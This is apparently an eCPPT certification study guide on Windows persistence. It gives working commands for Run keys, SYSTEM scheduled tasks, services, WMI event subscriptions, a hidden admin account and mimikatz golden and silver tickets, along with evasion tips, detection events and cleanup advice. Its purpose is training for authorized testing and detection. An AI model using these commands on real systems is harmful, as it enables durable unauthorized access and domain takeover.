# Phase 04 — Persistence

> eCPPT · Methodology — INE-Cybersecurity-Certifications-Guide

## Purpose

Persistence keeps access alive after a reboot, a password change, or a session loss — the difference between "one lucky shell" and a durable foothold. This phase covers Windows persistence mechanisms an assessor should *understand and know how to detect*, plus the Kerberos golden/silver ticket concepts that can outlive almost everything. Persistence techniques are for authorized labs and red-team exercises only; in a pentest they are usually demonstrated, documented, and then removed.

## Windows Persistence Mechanisms

### 1. Registry Run keys

The oldest trick: a command that executes at logon.

```powershell
# Current user (runs at that user's logon)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Users\jdoe\AppData\Local\updater.exe"
# Machine-wide (runs at any user logon, as that user)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Updater /t REG_SZ /d "C:\Windows\Tasks\updater.exe"
# Expected outcome: key appears under Run; fires at next interactive logon
```

Variants: `RunOnce`, `RunServices`, startup folders, and `Image File Execution Options` (IFEO) debugger hijack. Detection: Sysmon event 13 (registry value set) and Autoruns.

### 2. Scheduled tasks

Tasks survive reboots and can run as SYSTEM with no interactive logon.

```powershell
schtasks /create /tn "MSUpdate" /tr "C:\Windows\Tasks\updater.exe" /sc onlogon /ru SYSTEM /rl HIGHEST /f
# Expected outcome: created successfully; runs at every logon as SYSTEM
# Also useful: /sc onstart (boot), /sc daily, /sc onidle
```

Detection: Task Scheduler operational log, Sysmon 1 for the child process, and Autoruns.

### 3. Services

A service is a classic SYSTEM-level persistence primitive and doubles as a lateral-movement channel (Phase 02).

```powershell
# Install a new auto-start service (needs admin)
sc create MSUpdateSvc binPath= "C:\Windows\Tasks\updater.exe" start= auto
sc start MSUpdateSvc
# Expected outcome: service registered and running as LocalSystem
```

Quieter alternative: **modify an existing, legitimately disabled/unused service** (`sc config` + repoint `binPath`) so the service list looks unchanged. Detection: Event 7045 (new service installed), 4697, or 7040 for config changes.

### 4. WMI event subscriptions

Event-triggered persistence with no file on disk that Autoruns flags by default: an `__EventFilter` (trigger), an `__EventConsumer` (action), and a binding.

```powershell
# Register a filter that fires at system startup (authorized lab, admin rights)
$FilterArgs = @{ Name='StartupFilter'; EventNamespace='root\cimv2';
  QueryLanguage='WQL'; Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 120 AND TargetInstance.SystemUpTime < 325" }
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments $FilterArgs
$ConsumerArgs = @{ Name='StartupConsumer'; CommandLineTemplate='C:\Windows\Tasks\updater.exe' }
$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments $ConsumerArgs
Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{ Filter=$Filter; Consumer=$Consumer }
# Expected outcome: three WMI objects in root\subscription
```

Detection: inspect `root\subscription` for unexpected filters/consumers; EDR and Sysmon (event 19–21 with the right config) log WMI activity. This is one of the most useful mechanisms to *recognize* as a defender even if you rarely deploy it.

### 5. Account creation and ACL tricks

Often the most reliable persistence is *legitimate-looking* access.

```powershell
# Create a hidden-in-plain-sight support account (lab only)
net user support P@ssw0rd123! /add
net localgroup administrators support /add
# Expected outcome: new admin-capable account

# ACL/DCSync trick: grant a controlled account the right to replicate directory
# changes (GetChangesAll) -> the account can run DCSync against the domain
# Equivalent BloodHound edge: GenericAll/WriteDACL on the domain object
```

Related: `adminSDHolder` ACL modification (protects privileged groups but can be abused to re-add members), and adding accounts to groups with standing rights (Backup Operators, Account Operators). In labs, prefer *demonstrating* the ACL edge with BloodHound and reverting it — it is exactly what real attackers leave behind.

### 6. Golden and silver tickets (Kerberos persistence)

- **Golden ticket:** you hold the domain `krbtgt` account's hash (e.g., via DCSync). Forge a TGT for *any* user, *any* group membership (Domain Admins), valid for years. It survives password changes of every *user* — only a `krbtgt` password reset (twice, plus replication) invalidates it.
- **Silver ticket:** you hold the hash of a *specific service account* (e.g., the computer account of a file server). Forge a service ticket for that one service only — no TGT, no contact with the KDC, and (without PAC validation) the service never verifies it against the domain.

```text
# Golden ticket recipe (mimikatz, on a domain admin session in your lab)
kerberos::golden /user:fakeadmin /domain:corp.local /sid:S-1-5-21-<DOMAINSID> /krbtgt:<AES256KEY> /ptt
# Silver ticket recipe
kerberos::golden /user:fakeuser /domain:corp.local /sid:S-1-5-21-<DOMAINSID> /target:filesrv.corp.local /service:cifs /rc4:<MACHINE-HASH> /ptt
# Expected outcome: klist shows the forged ticket; access to the target works
```

Detection concepts: golden tickets can't be "seen" in the KDC logs (no AS-REQ), but anomalies like impossibly long-lived TGTs or never-before-seen logon IDs help; silver-ticket traffic shows unusual service logons (Event 4624/4769) without matching Kerberos pre-auth. Forge only what you need and keep lifetimes short in demonstrations.

## Detection & Operational Security Notes

- **Know your footprint:** Run keys → Sysmon 13; tasks/services → 4697/7045 + child process logs; WMI → Sysmon 19–21; forged tickets → KDC anomalies. Choose mechanisms that match the exercise's detection story.
- **Least-noise default:** in most labs, a scheduled task or a legitimate-looking account beats a new service for staying under the radar.
- **OPSEC while persisting:** don't disable AV/EDR unless scoped; avoid obvious names ("backdoor", "pwn"); use existing file paths and disguised binaries; keep timestamps plausible.
- **Cleanup discipline:** record every change (registry keys, tasks, services, WMI objects, accounts) with exact reversal commands; in a pentest, remove persistence at the end unless the client asked you to leave it for detection drills.
- **Scope reminders:** persistence on a client network is a serious action — confirm it is in the rules of engagement and that the client understands what will be left behind and for how long.

## Common Mistakes & Tips

- **Persistence that dies with the user:** Run keys fire only at interactive logon of that user — if the account is never logged in interactively, nothing runs.
- **Forgetting architecture:** an x86 binary under a Run key won't survive on x64 cleanly, and 32/64-bit registry views differ (`WOW6432Node`).
- **Golden ticket with the wrong SID:** you need the *domain* SID, not the user SID — a common reason the forged ticket is rejected.
- **One mechanism only:** a real foothold usually has 2–3 layers (startup + account + ticket). In a *lab*, one clean, documented example teaches more than a pile of them.
- **Not testing after reboot:** persistence that doesn't survive a reboot is not persistence — always validate.
- **Credential material handling:** store `krbtgt`/service hashes in your notes file with care; treat them as domain-equivalent secrets.

## Checklist / Self-test

- [ ] I can place a Run-key and a scheduled-task persistence and verify both fire after reboot/logon.
- [ ] I can register a service-based persistence and explain its detection events (7045/4697).
- [ ] I can create and bind a WMI `__EventFilter`/consumer and locate the objects in `root\subscription`.
- [ ] I can describe account/ACL persistence (adminSDHolder, DCSync rights) and detect it via BloodHound edges.
- [ ] I can explain golden vs. silver tickets: what key each needs, what it grants, and how it is invalidated.
- [ ] I can list the primary detection signals for each persistence mechanism.
- [ ] I document every persistence change with exact reversal commands and clean up after the exercise.

## Further Resources

- MITRE ATT&CK — Persistence tactics (T1547 boot/logon autostart, T1053 scheduled tasks, T1546 event-triggered, T1098 account manipulation, T1558 Kerberos tickets): https://attack.mitre.org/
- Microsoft Learn — Scheduled tasks and WMI event subscriptions documentation: https://learn.microsoft.com/en-us/windows/win32/wmisdk/receiving-events-at-all-times
- Microsoft Learn — WMI and Sysmon event reference: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon
- Microsoft Learn — AdminSDHolder technical reference: https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc730983(v=ws.10)
- HackTricks — Windows persistence: https://book.hacktricks.wiki/en/windows-hardening/windows-persistence.html
- Sysinternals Autoruns official page: https://learn.microsoft.com/en-us/sysinternals/downloads/autoruns
